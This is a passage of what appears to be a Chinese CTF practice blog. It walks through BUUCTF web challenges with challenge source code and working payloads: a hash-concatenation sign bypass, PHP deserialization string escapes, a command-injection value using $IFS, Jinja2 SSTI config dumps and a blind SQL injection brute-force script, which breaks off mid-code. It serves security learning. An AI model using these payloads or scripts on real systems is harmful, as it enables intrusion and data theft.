hashlib.md5(content).hexdigest()def waf(param):    check&#x3D;param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.debug &#x3D; False    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;9999)</code></pre><p>Flask框架，先看路由，geneSign是对传入的param与其他字符串拼接并返回其md5值，De1ta是主要，传入3个参数，以及ip，先判断param是否是gopher或者file开头的参数，不是则过到Task中，并且返回task的Exec()函数结果，另外hint给出提示在flag.txt中有flag</p><pre class="language-none"><code class="language-none">1：&#x2F;geneSign：获得url中parma参数，通过getSign(action, param)生成摘要2：&#x2F;De1ta：获得cookie中的action和sign，waf(param),创建task对象，调用exce()方法，json格式返回3：&#x2F;：返回源码</code></pre><p>三个函数</p><pre class="language-none"><code class="language-none">def getSign(action, param):    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check&#x3D;param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return False</code></pre><p>getSign：返回secert_key + param + action的哈希值<br>md5：<br>waf：禁止了flie和gopher协议</p><pre><code>task类class Task:    def __init__(self, action, param, sign, ip):        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)def Exec(self):    result = &#123;&#125;    result[&#39;code&#39;] = 500    if (self.checkSign()):        if &quot;scan&quot; in self.action:            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)            resp = scan(self.param)            if (resp == &quot;Connection Timeout&quot;):                result[&#39;data&#39;] = resp            else:                print resp                tmpfile.write(resp)                tmpfile.close()            result[&#39;code&#39;] = 200        if &quot;read&quot; in self.action:            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)            result[&#39;code&#39;] = 200            result[&#39;data&#39;] = f.read()        if result[&#39;code&#39;] == 500:            result[&#39;data&#39;] = &quot;Action Error&quot;    else:        result[&#39;code&#39;] = 500        result[&#39;msg&#39;] = &quot;Sign Error&quot;    return resultdef checkSign(self):    if (getSign(self.action, self.param) == self.sign):        return True    else:        return False</code></pre><p>checkSign：检查cookie中的sign<br>Exec：检查cookie中的action，如果scan在action中，将param的文件内容写入result.txt，如果read在action中，读出result.txt 的内容</p><p>hint提示flag在flag.txt 中，想要读到他<br>首先：action=scan，param=flag.txt ，将flag.txt的内容读到result.txt中<br>然后：action=read，将result.txt的内容读出</p><p>绕过点：sign<br>checkSign会检查cookie中的sign==getSign（param，action）<br>两个困难点：secert_key的值未知</p><p>思路：先进入/De1ta中的challenge函数，在Exec中的scan部分中将flag.txt的内容存入result.txt，然后从read部分中将其存到result字典中读出，再以json形式返回到客户端，我们就能得到flag。</p><p>写入与读出部分</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908232308596.png" alt="image-20210908232308596"></p><p>而如果action中既有scan,又有read,那么就会依次执行scan和read</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233510363.png" alt="image-20210908233510363"></p><p>而为了绕过这个验证，就要利用</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908233542937.png" alt="image-20210908233542937"></p><p>让param = flag.txtread</p><p>因为action为scan</p><p>所以得到的md5值为keyflag.txtreadscan</p><p>满足action=readscan param=flag.txt时的值</p><p><strong>解题</strong></p><p>​    首先进入genesign页面得到md5(keyflag.txtreadscan)的值作为sign</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234141816.png" alt="image-20210908234141816"></p><p>在到de1ta界面抓包get进param=flag.php，在cookie内加入sign和action</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908234443102.png" alt="image-20210908234443102"></p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>代码审计</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123;  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;  return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;  unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123;  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;  highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;  $userinfo &#x3D; unserialize($serialize_info);  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));  &#125;</code></pre><p>phpinfo里有东西，可以先看看</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812234826151.png" alt="image-20210812234826151"></p><p>接下来我们应该开始想怎么让</p><p>base64_decode($userinfo[&#39;img&#39;])的值等于flag的文件名</p><p><strong>知识点</strong></p><ul><li>反序列化中的对象逃逸</li><li>extract()变量覆盖</li></ul><p><strong>extract()变量覆盖</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813004733910.png" alt="image-20210813004733910"></p><p>但是这里我们不能直接给img赋值，因为img赋值发生在extract之后</p><p><strong>反序列化中的对象逃逸</strong></p><p><strong>键值逃逸</strong></p><ul><li>因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</li><li>并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号<code>&#123;&#125;</code>外的就都被扔掉。</li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813005203142.png" alt="image-20210813005203142"></p><p>接下来是构造payload的部分</p><p>首先我们需要构造img属性：</p><p>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; </p><p>其中的ZDBnM19mMWFnLnBocA==是d0g3_f1ag.php的base64加密的结果然后在这个属性前面随便加上个序列化字符串（只要是合法的就行），比如：</p><p>;s:1:“1”;<br>;s:2:“10”;<br>;s:3:“100”;</p><p>所以payload可以为：</p><pre class="language-php" data-language="php"><code class="language-php">_SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre><p>session中存在phpflag的原因是由于filter函数会将匹配到的值变为空，而phpflag的长度刚好为7</p><p><strong>为7的原因</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813010634981.png" alt="image-20210813010634981"></p><p>但是添加了filter函数来进行过滤之后</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813010753030.png" alt="image-20210813010753030"></p><p>原来的内容变为了</p><pre class="language-none"><code class="language-none">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre><p>能成功实现读取flag所在文件的命令</p><p>post后</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813011013959.png" alt="image-20210813011013959"></p><p>对/d0g3_fllllllag进行base64编码后为L2QwZzNfZmxsbGxsbGFn</p><p>所以直接把原来的编码替换掉就行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210813011156367.png" alt="image-20210813011156367"></p><p>看是看懂了，但我还是想不到这种payload。。。</p><p>参考文章</p><p><a href="https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">安洵杯 2019]easy_serialize_php -------- 反序列化/序列化和代码审计_若丶时光破灭的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;</code></pre><p><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 初赛]Love Math - MustaphaMond - 博客园 (cnblogs.com)</a></p><p> <a href="https://blog.csdn.net/miuzzx/article/details/104817391">CISCN 2019 初赛]Love Math_羽的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_37589805/article/details/116205287?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">CISCN 2019 初赛]Love Math_分享简单的安全技术-CSDN博客</a></p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220705465.png" alt="image-20210828220705465"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220729509.png" alt="image-20210828220729509"></p><p>payload：</p><p>？num=1e10&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828221110477.png" alt="image-20210828221110477"></p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><pre class="language-none"><code class="language-none">import flaskimport osapp &#x3D; flask.Flask(__name__)app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)&#x2F;&#x2F;注册了一个名为FLAG的config，这里基本可以确定是flag。@app.route(&#39;&#x2F;&#39;)def index():    return open(__file__).read()@app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]&#x2F;&#x2F;设置黑名单        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s&#x2F;&#x2F;把黑名单内的内容置空    return flask.render_template_string(safe_jinja(shrine))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(debug&#x3D;True)</code></pre><p>ssti注入，先试一个49</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230144787.png" alt="image-20210829230144787"></p><p>接下来就可以考虑在shrine下直接即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，在配合**globals()**，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230829515.png" alt="image-20210829230829515"></p><p>current_app意思应该是当前app，那我们就当前app下的config：</p><p>于是可以读到flag</p><pre class="language-none"><code class="language-none">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230933251.png" alt="image-20210829230933251"></p><p>也可以用</p><pre class="language-none"><code class="language-none">get_flashed_messages</code></pre><p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p><pre class="language-none"><code class="language-none">get_flashed_messages.__globals__[&#39;current_app&#39;].config</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829231104006.png" alt="image-20210829231104006"></p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>进入后是个登录页面，本来以为是sql注入，试了一下发现没能成功，扫目录扫到<a href="http://www.zip备份文件/">www.zip备份文件</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163607732.png" alt="image-20210903163607732"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903132345413.png" alt="image-20210903132345413"></p><p>访问一下register.php注册个账户就可以登录了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163626344.png" alt="image-20210903163626344"></p><p>再看其他的内容</p><p>profile.php</p><pre class="language-none"><code class="language-none">&lt;?php   require_once(&#39;class.php&#39;);   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;      die(&#39;Login First&#39;);       &#125;   $username &#x3D; $_SESSION[&#39;username&#39;];   $profile&#x3D;$user-&gt;show_profile($username);   if($profile  &#x3D;&#x3D; null) &#123;      header(&#39;Location: update.php&#39;);   &#125;   else &#123;      $profile &#x3D; unserialize($profile);      $phone &#x3D; $profile[&#39;phone&#39;];      $email &#x3D; $profile[&#39;email&#39;];      $nickname &#x3D; $profile[&#39;nickname&#39;];      $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));?&gt;</code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?phprequire(&#39;config.php&#39;);class user extends mysql&#123;   private $table &#x3D; &#39;users&#39;;   public function is_exists($username) &#123;      $username &#x3D; parent::filter($username);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      return parent::select($this-&gt;table, $where);   &#125;   public function register($username, $password) &#123;      $username &#x3D; parent::filter($username);      $password &#x3D; parent::filter($password);      $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;);      $value_list &#x3D; Array($username, md5($password));      return parent::insert($this-&gt;table, $key_list, $value_list);   &#125;   public function login($username, $password) &#123;      $username &#x3D; parent::filter($username);      $password &#x3D; parent::filter($password);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      $object &#x3D; parent::select($this-&gt;table, $where);      if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123;         return true;      &#125; else &#123;         return false;      &#125;   &#125;   public function show_profile($username) &#123;      $username &#x3D; parent::filter($username);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      $object &#x3D; parent::select($this-&gt;table, $where);      return $object-&gt;profile;   &#125;   public function update_profile($username, $new_profile) &#123;      $username &#x3D; parent::filter($username);      $new_profile &#x3D; parent::filter($new_profile);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);   &#125;   public function __tostring() &#123;      return __class__;   &#125;&#125;class mysql &#123;   private $link &#x3D; null;   public function connect($config) &#123;      $this-&gt;link &#x3D; mysql_connect(         $config[&#39;hostname&#39;],         $config[&#39;username&#39;],          $config[&#39;password&#39;]      );      mysql_select_db($config[&#39;database&#39;]);      mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;);      return $this-&gt;link;   &#125;   public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123;      $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;;      $result &#x3D; mysql_query($sql, $this-&gt;link);      return mysql_fetch_object($result);   &#125;   public function insert($table, $key_list, $value_list) &#123;      $key &#x3D; implode(&#39;,&#39;, $key_list);      $value &#x3D; &#39;\&#39;&#39; . implode(&#39;\&#39;,\&#39;&#39;, $value_list) . &#39;\&#39;&#39;;       $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;      return mysql_query($sql);   &#125;   public function update($table, $key, $value, $where) &#123;      $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;      return mysql_query($sql);   &#125;   public function filter($string) &#123;      $escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);      $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;      $string &#x3D; preg_replace($escape, &#39;_&#39;, $string);      $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);      $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;      return preg_replace($safe, &#39;hacker&#39;, $string);   &#125;   public function __tostring() &#123;      return __class__;   &#125;&#125;session_start();$user &#x3D; new user();$user-&gt;connect($config);</code></pre><p>update.php</p><pre class="language-none"><code class="language-none">&lt;?php   require_once(&#39;class.php&#39;);   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;      die(&#39;Login First&#39;);       &#125;   if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;      $username &#x3D; $_SESSION[&#39;username&#39;];      if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))         die(&#39;Invalid phone&#39;);      if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))         die(&#39;Invalid email&#39;);            if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)         die(&#39;Invalid nickname&#39;);      $file &#x3D; $_FILES[&#39;photo&#39;];      if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)         die(&#39;Photo size error&#39;);      move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));      $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];      $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];      $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];      $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);      $user-&gt;update_profile($username, serialize($profile));      echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;   &#125;   else &#123;?&gt;</code></pre><p>config.php</p><pre class="language-none"><code class="language-none">&lt;?php   $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;   $config[&#39;username&#39;] &#x3D; &#39;root&#39;;   $config[&#39;password&#39;] &#x3D; &#39;&#39;;   $config[&#39;database&#39;] &#x3D; &#39;&#39;;   $flag &#x3D; &#39;&#39;;?&gt;</code></pre><p>profile里有个file_get_content函数可能有文件读取漏洞，而flag在config.php中，就要让photo=config.php，这里可以利用前边的$profile = unserialize($profile);</p><p>所以再根据</p><pre class="language-none"><code class="language-none">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);     $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;     return preg_replace($safe, &#39;hacker&#39;, $string);  &#125;</code></pre><p>可以进行反序列化字符逃逸</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903162948758.png" alt="image-20210903162948758"></p><pre class="language-none"><code class="language-none">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>这里这个过滤可以利用抓包将nickename改成数组类型来绕过</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163055572.png" alt="image-20210903163055572"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163139438.png" alt="image-20210903163139438"></p><p>看一下这个your profile页面</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163211494.png" alt="image-20210903163211494"></p><p>看一下这个图片的源码，是个base64加密的内容，进行解密后可以得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163313640.png" alt="image-20210903163313640"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163322131.png" alt="image-20210903163322131"></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>进去后看源码，有一段js脚本</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906112938529.png" alt="image-20210906112938529"></p><p>试了一下这个md5，能解出来但是是付费记录</p><p>所以直接看flag.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113351506.png" alt="image-20210906113351506"></p><p>“除了购买者和我自己”</p><p>那就试试127.0.0.1本地访问</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906113445324.png" alt="image-20210906113445324"></p><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>盲注，注入点在id</p><p>可以利用异或来进行盲注</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906123555686.png" alt="image-20210906123555686"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906123751187.png" alt="image-20210906123751187"></p><p>找个脚本直接爆破，学一下这个脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport sysimport timedef get_DBlen(url):    for i in range(1,10):        db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i        r &#x3D; requests.get(db_url)        if &quot;Click&quot; in r.text:            print(&quot;数据库名称的长度为:%d&quot;%i)            return idef get_DBname(url,length):    DBname &#x3D; &quot;&quot;    length &#x3D; length + 1    for i in range(1,length):        Max &#x3D; 122        Min &#x3D; 41        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2        while Min &lt;&#x3D; Max:            # 爆表名            db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            r &#x3D; requests.get(db_url)            if &quot;Click&quot; in r.text:                Min&#x3D;Mid+1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            else:                Max &#x3D; Mid-1                Mid &#x3D; (Min+Max)&#x2F;&#x2F;2                pass            pass        DBname &#x3D; DBname + chr(Mid)    print(DBname)    return DBnamedef get_TBname(url):    name&#x3D;&quot;&quot;    i &#x3D; 0    while True:        i &#x3D; i+1        Max &#x3D; 128        Min &#x3D; 32        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2        while Min &lt;&#x3D; Max:            # 爆表名            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            # 爆字段名            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            # 